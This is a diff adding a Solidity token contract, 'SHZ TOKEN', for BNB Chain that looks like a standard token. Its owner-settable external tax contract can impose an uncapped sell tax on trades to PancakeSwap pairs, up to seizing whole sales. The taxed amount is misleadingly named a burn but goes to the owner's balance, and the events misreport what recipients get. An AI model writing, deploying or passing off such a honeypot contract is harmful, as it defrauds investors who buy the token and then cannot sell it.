@@ -1,0 +1,86 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.17;
+
+contract SHZToken {
+    string public constant name = "SHZ TOKEN";
+    string public constant symbol = "SHZ";
+    uint8 public constant decimals = 18;
+    uint256 public totalSupply = 1000000000 * 10 ** decimals;
+    
+    mapping(address => uint256) private balances;
+    mapping(address => mapping(address => uint256)) public allowance;
+    mapping(address => bool) public isPairAddress;
+    
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+
+    address public factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
+    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address public BSC_USDT = 0x55d398326f99059fF775485246999027B3197955;
+    address public BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
+    address public USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
+
+    address public taxContract;
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+        balances[msg.sender] = totalSupply;
+        isPairAddress[computePairAddress(WBNB)] = true;
+        isPairAddress[computePairAddress(BSC_USDT)] = true;
+        isPairAddress[computePairAddress(BUSD)] = true;
+        isPairAddress[computePairAddress(USDC)] = true;
+        emit Transfer(address(0), msg.sender, totalSupply);
+    }
+
+    function computePairAddress(address tokenB) internal view returns (address) {
+        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));
+        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
+    }
+    function balanceOf(address account) public view returns (uint256) {
+        return balances[account];
+    }
+    function approve(address spender, uint256 amount) public returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+    function transfer(address to, uint256 amount) public returns (bool) {
+        return _transfer(msg.sender, to, amount);
+    }
+    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+        require(amount <= allowance[from][msg.sender]);
+        allowance[from][msg.sender] -= amount;
+        return _transfer(from, to, amount);
+    }
+    function setTaxContract(address _address) public {
+        require(msg.sender==owner , "Only owner!");
+        taxContract = _address;
+    }
+    function getSellTax() public returns (uint256 _sellTax) {
+        if(taxContract==address(0)) _sellTax = 10;
+        else{
+            (bool success, bytes memory returnData) = taxContract.call(abi.encodeWithSelector(0xb0bc85de));
+            if(success) _sellTax = abi.decode(returnData, (uint256));
+        }
+    }
+
+    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
+        require(from!= address(0) && to!= address(0));
+        require(amount <= balances[from] && amount>0);
+        
+        uint256 _sellTax = getSellTax() ;
+        uint256 _burnAmount = isPairAddress[to] && from!=owner && from!=router ? amount * _sellTax / 100 : uint256(0);
+
+        balances[from] -= amount;
+        balances[to] += (amount - _burnAmount);
+        balances[owner] += _burnAmount;
+
+        emit Transfer(from, owner, _burnAmount);
+        emit Transfer(from, to, amount);
+
+        return true;
+    }
+}
